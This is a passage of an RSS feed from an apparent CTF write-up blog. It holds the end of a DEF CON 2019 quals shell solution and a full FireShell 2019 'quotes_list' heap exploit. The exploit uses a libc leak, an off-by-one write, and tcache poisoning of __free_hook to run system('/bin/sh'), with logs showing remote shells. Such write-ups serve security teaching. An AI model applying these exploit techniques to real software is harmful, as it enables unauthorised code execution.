&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;writeUInt32LE&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;pie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;native_system&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9c78&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/bin/sh&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;λ › python2 solve.py
[+] Opening connection to speedrun-012.quals2019.oooverflow.io on port 31337: Done
[*] Switching to interactive mode
20eb0270
20ea6000
$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
$ cat flag
OOO{Rule #3: Never `open` the package. Who knows what pwns are lying about?
&lt;/code&gt;&lt;/pre&gt;</description>
       </item>
       
       <item>
         <title>FireShell 2019 - quotes_list</title>
         <link>http://kiror0.github.io/ctf/posts/fireshell-2019-quotes-list/</link>
         <pubDate>Mon, 28 Jan 2019 06:54:42 +0000</pubDate>
         
         <guid>http://kiror0.github.io/ctf/posts/fireshell-2019-quotes-list/</guid>
         <description>&lt;h2 id=&#34;downloads&#34;&gt;downloads&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://kiror0.github.io/ctf/assets/fireshell/quotes_list/quotes_list.zip&#34;&gt;binary&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://kiror0.github.io/ctf/assets/fireshell/quotes_list/libc.so.6&#34;&gt;libc.so.6&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://kiror0.github.io/ctf/assets/fireshell/quotes_list/ld-linux-x86-64.so.2&#34;&gt;ld-linux-x86-64.so.2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://kiror0.github.io/ctf/assets/fireshell/quotes_list/solve.py&#34;&gt;solve.py&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;prep&#34;&gt;prep&lt;/h2&gt;
&lt;p&gt;You&#39;ll need to patch elf binary to make it run correctly. Using &lt;code&gt;patchelf&lt;/code&gt;,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;patchelf --set-interpreter &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;pwd&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;/ld-linux-x86-64.so.2
patchelf --set-rpath &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;pwd&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;summary&#34;&gt;summary&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Usual heap exploitation challenge layout, you have &lt;code&gt;create&lt;/code&gt;, &lt;code&gt;edit&lt;/code&gt;, &lt;code&gt;show&lt;/code&gt;, and &lt;code&gt;delete&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;No UAF, pointer set to zero after chunk gets freed. &lt;em&gt;or is it(?)&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Arbritrary off-by-one write in &lt;code&gt;edit&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;for unknown &lt;em&gt;reason(?)&lt;/em&gt;, &lt;code&gt;show&lt;/code&gt; uses &lt;code&gt;strncpy&lt;/code&gt; to a buffer in stack initialized with &lt;code&gt;alloca(16 * ((chunk_size + 15) / 16 ))&lt;/code&gt; then print it.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;exploit&#34;&gt;exploit&lt;/h2&gt;
&lt;p&gt;A brief helper function,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;create&lt;/span&gt;(length, content):
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, length&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__str__())
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, content)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;edit&lt;/span&gt;(index, content):
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, index&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__str__())
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, content)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;show&lt;/span&gt;(index):
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, index&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__str__())
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;-----&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, drop&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;True)

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;delete&lt;/span&gt;(index):
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;, index&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__str__())
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;leak-libc&#34;&gt;leak libc&lt;/h3&gt;
&lt;p&gt;The binary uses libc v2.28 which enables &lt;code&gt;tcache&lt;/code&gt;, a simple trick to leak libc is to allocate a huge chunk that big enough to surpass &lt;code&gt;smallbins&lt;/code&gt; and &lt;code&gt;free&lt;/code&gt; it, for some reasons allocating smallbins then free, it will only get your chunk back to tcache free list and we don&#39;t want that. Code speak louder than words,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;create(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# _huge_ chunk&lt;/span&gt;
create(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# will be used later&lt;/span&gt;
create(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# will be used later&lt;/span&gt;
create(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# will be used later&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# pwndbg&amp;gt; dq $piebase+0x202040&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0000555555756040     000055555575c250 000055555575d270&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0000555555756050     000055555575d290 000055555575d2b0&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0000555555756060     0000000000000000 0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0000555555756070     0000001800001000 0000001800000018&lt;/span&gt;

delete(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# pwndbg&amp;gt; dq $piebase+0x202040&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0000555555756040     0000000000000000 000055555575d270&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0000555555756050     000055555575d290 000055555575d2b0&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0000555555756060     0000000000000000 0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0000555555756070     00000018ffffffff 0000001800000018&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# pwndbg&amp;gt; dq 0x000055555575c250&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575c250     0000000000000000 0000000000001011&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575c260     0000155555327ca0 0000155555327ca0&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#                       ^-- fd populated&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# pwndbg&amp;gt; x/gx 0x0000155555327ca0&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x155555327ca0 &amp;lt;main_arena+96&amp;gt;: 0x000055555575d2c0&lt;/span&gt;

create(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# pwndbg&amp;gt; dq 0x000055555575c250&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575c250     0000000000000000 0000000000000021&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575c260     0000155555328230 00001555553282c0&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575c270     000055555575c250 0000000000000ff1&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575c280     0000155555327ca0 0000155555327ca0&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# pwndbg&amp;gt; unsortedbin&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# unsortedbin&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# all: 0x55555575c270 —▸ 0x155555327ca0 (main_arena+96) ◂— 0x55555575c270&lt;/span&gt;

libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; u64(show(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3af230&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;off-by-one-write&#34;&gt;off-by-one write&lt;/h3&gt;
&lt;p&gt;after allocate memory with &lt;code&gt;create&lt;/code&gt;, you can &lt;code&gt;edit&lt;/code&gt; the buf with exactly one byte larger than actual size. This could lead to corrupt the chunk metadata.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# pwndbg&amp;gt; dq 0x000055555575d260 50&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575d260     0000000000000ff0 0000000000000020&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575d270     0000000000000031 0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575d280     0000000000000000 0000000000000021&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575d290     0000000000000032 0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575d2a0     0000000000000000 0000000000000021&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575d2b0     0000000000000033 0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575d2c0     0000000000000000 000000000001fd41&lt;/span&gt;

edit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x71&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# overlap&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# pwndbg&amp;gt; dq 0x000055555575d260 50&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575d260     0000000000000ff0 0000000000000020&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575d270     0000000000000000 0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575d280     0000000000000000 0000000000000071&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#                                         ^-- corrupted&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575d290     0000000000000032 0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575d2a0     0000000000000000 0000000000000021&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575d2b0     0000000000000033 0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575d2c0     0000000000000000 000000000001fd41&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;after corrupting metadata size, we could trick &lt;code&gt;free&lt;/code&gt; to put this chunk in a larger chunk (0x70) tcache free list.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;delete(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# pwndbg&amp;gt; dq 0x000055555575d260 50&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575d260     0000000000000ff0 0000000000000020&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575d270     0000000000000000 0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575d280     0000000000000000 0000000000000071&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575d290     0000000000000000 000055555575c010&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575d2a0     0000000000000000 0000000000000021&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# pwndbg&amp;gt; tcachebins&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# tcachebins&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x70 [  1]: 0x55555575d290 ◂— 0x0 &amp;lt;--- !!!!&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;By malloc first-fit behaviour, &lt;code&gt;malloc&lt;/code&gt; with size &lt;code&gt;(0x68)&lt;/code&gt; will return the freed chunk before where the actual chunk size should be &lt;code&gt;(0x18)&lt;/code&gt;. Thus, we could achieve complete takeover for the next chunk.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;create(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x68&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# pwndbg&amp;gt; dq 0x000055555575d260 50&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575d260     0000000000000ff0 0000000000000020&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575d270     0000000000000000 0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575d280     0000000000000000 0000000000000071&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575d290     0000000000000032 0000000000000000&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 000055555575d2a0     0000000000000000 0000000000000021&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After that, it&#39;s just a simple poke around in &lt;code&gt;tcache-poison&lt;/code&gt;ing, overwrite &lt;code&gt;__free_hook&lt;/code&gt; to &lt;code&gt;system&lt;/code&gt;, and trigger &lt;code&gt;free&lt;/code&gt; to call &lt;code&gt;system&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;delete(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)
edit(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p64(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;__free_hook&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;]))

&lt;span style=&#34;color:#75715e&#34;&gt;# pwndbg&amp;gt; tcachebins&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# tcachebins&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 0x20 [  1]: 0x55555575d2b0 —▸ 0x1555553298c8 (__free_hook) ◂— 0x0&lt;/span&gt;

create(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/bin/sh&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# 3&lt;/span&gt;
create(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x18&lt;/span&gt;, p64(libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;system&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;])) &lt;span style=&#34;color:#75715e&#34;&gt;# 4&lt;/span&gt;

delete(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# trigger free(&amp;#39;/bin/sh&amp;#39;) -&amp;gt; system(&amp;#39;/bin/sh&amp;#39;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;flag&#34;&gt;flag&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;[+] Opening connection to 35.243.188.20 on port 2005: Done
[*] Switching to interactive mode
Timeout!
$ ls
flag.txt
quotes_list
quotes_list.sh
$ cat flag.txt
F#{th3r3_ar3_s0m3_n3ws_c0mm1ng_1nt0_libc-2.29}$
[*] Interrupted
